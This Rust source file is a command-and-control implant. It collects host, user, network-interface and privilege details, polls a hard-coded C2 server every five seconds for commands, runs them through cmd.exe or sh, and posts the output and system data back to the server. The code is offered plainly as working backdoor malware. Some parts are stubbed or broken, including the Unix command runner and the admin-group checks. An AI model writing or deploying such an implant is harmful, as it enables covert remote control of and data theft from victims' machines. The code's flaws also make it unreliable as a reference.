// Crates: General
use std::error::Error;
use std::{thread, time};
use std::env;
use os_info;
use whoami;
use get_if_addrs::{get_if_addrs, IfAddr};
use reqwest;
use reqwest::blocking::Client;
use serde::Serialize;
use serde::Deserialize;
use serde_json;
use chrono::Local;
use std::process::Command as ProcessCommand;
use std::str;

// -------------------------------------------------------------------------------
// Structs
// -------------------------------------------------------------------------------
#[derive(Serialize)]
struct InterfaceInfo {
    ip_type: String,
    ip_addr: String,
    netmask: String,
    broadcast: Option<String>,
}

#[derive(Serialize)]
struct SystemData {
    hostname: String,
    os_type: String,
    os_version: String,
    interfaces: Vec<InterfaceInfo>,
    username: String,
    is_admin_user: bool,
    is_admin_process: bool,
    host_time: String,
}

#[derive(Debug, Serialize)]
struct ExecutedCommand {
    command: String,
    stdout: String,
    stderr: String,
    result: String
}

#[derive(Debug, Deserialize)]
struct CheckPendingCommandHTTPResponse {
    hostname: String,
    pending_commands: Vec<String>,
}

#[derive(Serialize)] // Add this derive macro
struct C2ReportData {
    system_data: SystemData,
    executed_command: ExecutedCommand,
}


// -------------------------------------------------------------------------------
// Constants
// -------------------------------------------------------------------------------
const C2_SERVER: &str = "http://192.168.1.32:9090";

// ===============================================================================
// ███████ ██    ██ ███    ██  ██████ ████████ ██  ██████  ███    ██ ███████ 
// ██      ██    ██ ████   ██ ██         ██    ██ ██    ██ ████   ██ ██      
// █████   ██    ██ ██ ██  ██ ██         ██    ██ ██    ██ ██ ██  ██ ███████ 
// ██      ██    ██ ██  ██ ██ ██         ██    ██ ██    ██ ██  ██ ██      ██ 
// ██       ██████  ██   ████  ██████    ██    ██  ██████  ██   ████ ███████ 
// ===============================================================================

// -------------------------------------------------------------------------------
// IsAdminProcess (Linux)
// -------------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn is_admin_process() -> bool {
    // geteuid() returns the UID. Root is 0.
    unsafe { libc::geteuid() == 0 }
}

// -------------------------------------------------------------------------------
// IsAdminProcess (Windows)
// -------------------------------------------------------------------------------
#[cfg(target_os = "windows")]
fn is_admin_process() -> bool {
    use std::ptr::null_mut;
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, HANDLE, TOKEN_QUERY};
    use winapi::um::handleapi::CloseHandle;

    unsafe {
        let process_handle = GetCurrentProcess();
        let mut token_handle: HANDLE = null_mut();

        if OpenProcessToken(process_handle, TOKEN_QUERY, &mut token_handle) == 0 {
            return false;
        }

        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;

        let result = GetTokenInformation(
            token_handle,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        );
        CloseHandle(token_handle);

        if result == 0 {
            return false;
        }

        elevation.TokenIsElevated != 0
    }
}

// -------------------------------------------------------------------------------
// IsUserAdminGroupMember (Linux) (To be implemented)
// -------------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn is_user_admin_group_member(username: &str) -> bool {
   return false;
}

// -------------------------------------------------------------------------------
// IsUserAdminGroupMember (Windows)
// -------------------------------------------------------------------------------
#[cfg(target_os = "windows")]
fn is_user_admin_group_member(username: &str) -> bool {
    use std::ptr::null;
    use winapi::shared::lmcons::NET_API_STATUS;
    use winapi::um::lmaccess::{NetUserGetLocalGroups, LG_INCLUDE_INDIRECT};
    use winapi::um::lmapibuf::NetApiBufferFree;
    use widestring::U16CString;
    use winapi::ctypes::c_void;

    let mut bufptr: *mut u8 = std::ptr::null_mut();
    let mut entries_read = 0;
    let mut total_entries = 0;
    let username_w = U16CString::from_str(username).unwrap_or_default();

    let status: NET_API_STATUS = unsafe {
        NetUserGetLocalGroups(
            null(),               // servername: NULL
            username_w.as_ptr(),  // user
            0,                    // level
            LG_INCLUDE_INDIRECT,  // flags
            &mut bufptr,
            winapi::shared::lmcons::MAX_PREFERRED_LENGTH,
            &mut entries_read,
            &mut total_entries,
        )
    };

    if status != 0 {
        return false;
    }

    // [...] do stuff with `bufptr` and check for Administrators group

    unsafe {
        // Casting to `*mut c_void` from the winapi crate:
        NetApiBufferFree(bufptr as *mut c_void);
    }

    true
}

// -------------------------------------------------------------------------------
// GetInterfaces (Multi-platform)
// -------------------------------------------------------------------------------
fn get_interfaces() -> Vec<InterfaceInfo> {
    let mut interfaces_list: Vec<InterfaceInfo> = Vec::new();
    if let Ok(ifaces) = get_if_addrs() {
        for iface in ifaces {
            if iface.addr.is_loopback() {
                continue;
            }
            match iface.addr {
                IfAddr::V4(v4_addr) => {
                    interfaces_list.push(InterfaceInfo {
                        ip_type: "v4".to_string(),
                        ip_addr: v4_addr.ip.to_string(),
                        netmask: v4_addr.netmask.to_string(),
                        broadcast: v4_addr.broadcast.map(|b| b.to_string()),
                    });
                }
                IfAddr::V6(v6_addr) => {
                    interfaces_list.push(InterfaceInfo {
                        ip_type: "v6".to_string(),
                        ip_addr: v6_addr.ip.to_string(),
                        netmask: v6_addr.netmask.to_string(),
                        broadcast: v6_addr.broadcast.map(|b| b.to_string()),
                    });
                }
            }
        }
        return interfaces_list;
    }
    interfaces_list
}

// -------------------------------------------------------------------------------
// Gather System Data
// -------------------------------------------------------------------------------
fn gather_system_data() -> SystemData {
    let info: os_info::Info = os_info::get();
    let os_type: String = info.os_type().to_string();
    let os_version: String = info.version().to_string();
    let username: String = whoami::username();
    let hostname: String = env::var("HOSTNAME").or_else(|_| env::var("COMPUTERNAME")).unwrap_or_else(|_| "Unknown".into());
    let host_time = Local::now().format("%d/%m/%Y %H:%M:%S").to_string();
    let is_admin_process = is_admin_process();
    let is_admin_user = is_user_admin_group_member(&username);
    let interfaces_list = get_interfaces();

    SystemData {
        hostname,
        os_type,
        os_version,
        interfaces: interfaces_list,
        username,
        is_admin_user,
        is_admin_process,
        host_time,
    }
}

// -------------------------------------------------------------------------------
// eXecute Commands (Windows) run `cmd.exe /C <command>
// -------------------------------------------------------------------------------
#[cfg(target_os = "windows")]
fn execute_command(command: &str) -> ExecutedCommand {
    let output_result = ProcessCommand::new("cmd.exe").args(["/C", command]).output();
    let (stdout, stderr, run_error) = match output_result {
        Ok(output) => {
            let out = String::from_utf8_lossy(&output.stdout).to_string();
            let err = String::from_utf8_lossy(&output.stderr).to_string();
            (out, err, None)
        }
        Err(e) => (String::new(), String::new(), Some(e)),
    };
    // Convert the result to a string message.
    let result = match run_error {
        None => "Ok".to_string(),
        Some(e) => format!("Error: {}", e),
    };

    ExecutedCommand {
        command: command.to_string(),
        stdout,
        stderr,
        result,
    }
}

// -------------------------------------------------------------------------------
// Check Pending Commands
// -------------------------------------------------------------------------------
fn check_pending_commands() -> Result<Option<CheckPendingCommandHTTPResponse>, Box<dyn Error>> {
    let client = Client::new();
    let response = client
        .get(format!("{}{}", C2_SERVER, "/check_pending_commands?hostname=BITWIZ4RD"))
        .header("Content-Type", "application/json")
        .send()?;

    if response.status().is_success() {
        let command_response: CheckPendingCommandHTTPResponse = response.json()?; // Deserialize JSON response
        println!("Received Commands: {:?}", command_response.pending_commands);

        // If there are pending commands, return them
        if !command_response.pending_commands.is_empty() {
            return Ok(Some(command_response));
        } else {
            return Ok(None);
        }
    }
    else {
        eprintln!("{} - Failed to fetch commands!", response.status());
        Ok(None)
    }
}

// -------------------------------------------------------------------------------
// eXecute Commands
// -------------------------------------------------------------------------------
// For Unix-like systems: run `sh -c <command>`
#[cfg(not(target_os = "windows"))]
fn execute_command(command: &str) -> io::Result<()> {
    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .output()?; // Waits for command to finish, collects output

    println!("--- STDOUT ---\n{}", String::from_utf8_lossy(&output.stdout));
    eprintln!("--- STDERR ---\n{}", String::from_utf8_lossy(&output.stderr));
    Ok(())
}

// -------------------------------------------------------------------------------
// Send data
// -------------------------------------------------------------------------------
fn send_data() -> Result<(), Box<dyn Error>> {
    // Gather system data
    let system_data = gather_system_data();
    println!("Time: {}", system_data.host_time);

    // eXecute pending commands
    let pending_commands = check_pending_commands()?;
    let mut executed_command = None; // Use an Option to store executed command results

    if let Some(commands) = pending_commands {
        if !commands.pending_commands.is_empty() {
            let command = &commands.pending_commands[0]; // Take the first command
            println!("Executing command: {}", command);
            executed_command = Some(execute_command(command)); // Store executed command
            println!("Command Output: {:?}", executed_command);
        } else {
            println!("No pending commands.");
        }
    }

    // Use a default executed command if none was executed
    let executed_command = executed_command.unwrap_or(ExecutedCommand {
        command: "None".to_string(),
        stdout: "".to_string(),
        stderr: "".to_string(),
        result: "No command executed".to_string(),
    });

    // Join data to be sent
    let c2_report_data = C2ReportData {
        system_data,
        executed_command,
    };

    // Serialize JSON object and send data back to C2
    let json_body = serde_json::to_string(&c2_report_data)?; // Fix: Send `c2_report_data`
    let client = reqwest::blocking::Client::new();
    let response = client
        .post(format!("{}{}", C2_SERVER, "/heartbeat"))
        .header("Content-Type", "application/json")
        .body(json_body)
        .send()?;

    println!("{} - Data sent successfully!", response.status());
    Ok(())
}

// -------------------------------------------------------------------------------
// Main
// -------------------------------------------------------------------------------
fn main() {
    println!("====================================================");
    loop {
        match send_data() {
            Ok(_) => print!("Data sent successfully!"),
            Err(e) => eprint!("Error!!! {}", e),
        }
        println!("\n====================================================");
        thread::sleep(time::Duration::from_millis(5000));
    }
}